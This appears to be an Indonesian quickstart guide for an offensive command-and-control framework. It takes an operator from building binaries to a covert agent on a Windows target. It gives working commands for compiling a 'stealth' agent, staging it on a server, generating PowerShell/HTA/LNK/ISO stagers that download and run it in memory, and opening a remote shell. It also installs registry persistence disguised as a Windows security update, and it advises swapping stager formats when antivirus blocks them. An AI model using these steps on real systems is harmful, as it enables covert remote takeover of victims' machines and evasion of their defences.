# 03 — Quickstart: Dari Nol ke Agent Aktif

> Panduan ini membawa kamu dari instalasi bersih ke agent aktif yang berjalan di mesin target
> dengan perintah pertama berhasil dieksekusi. Ikuti langkah secara berurutan.

---

## Gambaran Alur

```
[Mesin Operator / Build Machine]
        │
        │ 1. Clone & build
        │ 2. Jalankan server di VPS
        │ 3. Compile agent dengan IP server
        │ 4. Generate stager dari agent
        │
        ▼
[VPS / C2 Server]
        │
        │ Server mendengarkan beacon
        │
        ▼ (stager delivery)
[Target Windows]
        │
        │ 5. Eksekusi stager
        │ 6. Stager download & jalankan agent
        │ 7. Agent beacon ke server
        │
        ▼
[Operator Console]
        └── 8. Lihat agent, kirim perintah, lihat hasil
```

---

## Langkah 1 — Build Semua Binary

```bash
git clone https://github.com/mjopsec/taburtuaiC2.git
cd taburtuaiC2
go mod download && go mod tidy
make all
```

**Output yang diharapkan:**
```
[*] Building C2 server...
[+] Server: bin/server
[*] Building operator CLI...
[+] Operator: bin/operator
[*] Building generator...
[+] Generator: bin/generate
```

---

## Langkah 2 — Jalankan Server C2

Jalankan server di VPS yang bisa diakses dari internet. Ganti `K3yRah4sia` dengan
key acak minimal 16 karakter — **catat key ini**, harus sama persis saat build agent.

```bash
# Di VPS
ENCRYPTION_KEY=K3yRah4siaEnkripsi2026 ./bin/server --port 8000
```

**Output:**
```
[2026-04-23 09:00:00] INFO  Taburtuai C2 Server v1.0
[2026-04-23 09:00:00] INFO  Encryption: AES-256-GCM ready
[2026-04-23 09:00:00] INFO  Listening on :8000
[2026-04-23 09:00:00] INFO  Ready.
```

**Verifikasi server bisa diakses:**
```bash
curl http://VPS_IP:8000/api/v1/health
# {"success":true,"message":"ok","data":{"status":"healthy"}}
```

Jika tidak bisa akses:
```bash
sudo ufw allow 8000/tcp && sudo ufw reload
```

---

## Langkah 3 — Build Agent

Ganti `172.23.0.118` dengan IP VPS kamu.

```bash
make agent-win-stealth \
  C2_SERVER=http://172.23.0.118:8000 \
  ENC_KEY=K3yRah4siaEnkripsi2026 \
  INTERVAL=30 \
  JITTER=20
```

**Output:**
```
[*] Building Windows stealth agent...
    Server   : http://172.23.0.118:8000
    Interval : 30s   Jitter: 20%
    Transport: http
[+] Windows stealth: bin/agent_windows_stealth.exe (8.4 MB)
```

---

## Langkah 4 — Upload Agent ke Stage Server

```bash
./bin/operator stage upload ./bin/agent_windows_stealth.exe \
  --server http://172.23.0.118:8000 \
  --format exe \
  --arch amd64 \
  --ttl 24 \
  --desc "quickstart-agent"
```

**Output:**
```
[+] Uploading agent (8.4 MB)...
[+] Stage registered successfully.

    Token    : 6a69a21a750af40e983cf257b3d2e4a9
    Stage URL: http://172.23.0.118:8000/stage/6a69a21a750af40e983cf257b3d2e4a9
    Format   : exe (amd64)
    TTL      : 24 hours (expires 2026-04-24 09:15:00 UTC)
    Desc     : quickstart-agent

[i] Share the Stage URL or use it to generate a stager.
```

**Simpan token ini.** Dibutuhkan untuk generate stager.

---

## Langkah 5 — Generate Stager

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token 6a69a21a750af40e983cf257b3d2e4a9 \
  --key K3yRah4siaEnkripsi2026 \
  --format ps1 \
  --output stager.ps1
```

**Output:**
```
[*] Generating PowerShell stager...
[+] Stager written: stager.ps1 (2.1 KB)

    Download URL: http://172.23.0.118:8000/stage/6a69a21a750af40e983cf257b3d2e4a9
    Exec method : in-memory (reflective load)
```

**Format stager tersedia:**

| Format | Cara Pakai |
|--------|------------|
| `ps1` | `powershell -ep bypass -f stager.ps1` |
| `bat` | Klik atau scheduled task |
| `hta` | `mshta stager.hta` atau browser |
| `lnk` | Klik shortcut di Explorer |
| `iso` | Mount dan klik file di dalam |
| `exe` | Jalankan langsung |

---

## Langkah 6 — Kirim Stager ke Target

Untuk lab/testing (jalankan di target Windows):

```powershell
Set-ExecutionPolicy Bypass -Scope Process
.\stager.ps1
```

Agent berjalan di background — tidak ada jendela yang muncul.

---

## Langkah 7 — Buka Console dan Lihat Agent

```bash
./bin/operator console --server http://172.23.0.118:8000
```

Di dalam console:
```
taburtuai(172.23.0.118:8000) › agents list
```

**Output:**
```
[+] Found 1 agent(s):

AGENT ID         HOSTNAME         USERNAME  OS       STATUS   LAST SEEN
2703886d         DESKTOP-QLPBF95  windows   windows  online   3s ago
```

---

## Langkah 8 — Eksekusi Perintah Pertama

```
taburtuai(172.23.0.118:8000) › cmd 2703886d "whoami"
```

**Output:**
```
[*] Queuing command...
[+] Command queued: a1b2c3d4-5e6f-7890-abcd-ef1234567890
[*] Waiting for result (timeout: 30s)...
[+] Result received (1.3s):

DESKTOP-QLPBF95\windows
```

```
taburtuai(172.23.0.118:8000) › cmd 2703886d "whoami /priv"
```

**Output:**
```
[+] Result received (0.9s):

PRIVILEGES INFORMATION
----------------------

Privilege Name                  State
=============================== ========
SeShutdownPrivilege             Disabled
SeChangeNotifyPrivilege         Enabled
SeUndockPrivilege               Disabled
SeIncreaseWorkingSetPrivilege   Disabled
```

---

## Langkah 9 — Interactive Shell

```
taburtuai(172.23.0.118:8000) › shell 2703886d
```

**Output:**
```
[*] Opening interactive shell on DESKTOP-QLPBF95...

[shell 2703886d DESKTOP-QLPBF95\windows] > net user
User accounts for \\DESKTOP-QLPBF95
Administrator  DefaultAccount  Guest  windows  WDAGUtilityAccount

[shell 2703886d DESKTOP-QLPBF95\windows] > ipconfig
Windows IP Configuration
Ethernet adapter Ethernet:
   IPv4 Address. . . . : 192.168.1.105
   Subnet Mask . . . . : 255.255.255.0
   Default Gateway . . : 192.168.1.1

[shell 2703886d DESKTOP-QLPBF95\windows] > exit
[*] Shell session closed.
```

---

## Langkah 10 — Setup Persistence

```
taburtuai(172.23.0.118:8000) › persistence setup 2703886d \
  --method registry_run \
  --name "WindowsSecurityUpdate" \
  --wait
```

**Output:**
```
[*] Setting up registry_run persistence...
[*] Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate
[+] Persistence installed successfully.
[i] Agent akan restart otomatis setelah logon berikutnya.
```

---

## Checklist

```
[✓] Server C2 berjalan, bisa diakses dari internet
[✓] Agent dikompilasi dengan IP server dan key yang sama
[✓] Agent diupload ke stage server, token tersimpan
[✓] Stager di-generate dan dikirim ke target
[✓] Agent muncul di agents list, status "online"
[✓] Perintah berhasil dieksekusi
[✓] Interactive shell berfungsi
[✓] Persistence terpasang
```

---

## Troubleshooting Cepat

| Masalah | Penyebab | Solusi |
|---------|----------|--------|
| Agent tidak muncul | Server tidak bisa diakses dari target | Cek firewall VPS |
| Command stuck "pending" | Key mismatch | Rebuild dengan ENC_KEY yang sama dengan server |
| Stage 404 | Token expired atau tidak diupload | Upload ulang |
| Stager diblokir AV | Deteksi stager | Gunakan format lain: hta/lnk/iso |
| Console gagal konek | Server down atau IP salah | Verifikasi server masih jalan |

---

**Selanjutnya:** [04 — Agent Management](04-agents.md)
